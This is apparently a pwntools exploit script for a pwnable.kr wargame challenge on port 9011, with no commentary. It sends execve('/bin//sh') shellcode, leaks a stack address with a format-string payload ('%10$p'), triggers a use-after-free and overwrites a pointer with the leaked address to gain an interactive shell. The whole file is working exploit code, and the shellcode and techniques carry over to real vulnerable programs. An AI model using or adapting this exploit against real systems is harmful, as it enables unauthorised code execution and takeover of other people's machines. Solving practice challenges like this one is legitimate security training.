from pwn import *

SHELLCODE = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
p = remote('pwnable.kr', 9011)
p.sendlineafter("? : ", SHELLCODE)
p.sendlineafter("> ", "2")
p.sendlineafter("hello", "%10$p")
leak_address = p.recvuntil("goodbye").split("\n")[1]
print "Leak: ", leak_address
p.sendlineafter("> ", "4") # UAF
p.sendlineafter("(y/n)", "n")
p.sendlineafter("> ", "3")
p.sendlineafter("hello", "A"*24 + p64(int(leak_address, 16) - 0x20))
p.sendlineafter("> ", "3")
p.interactive()
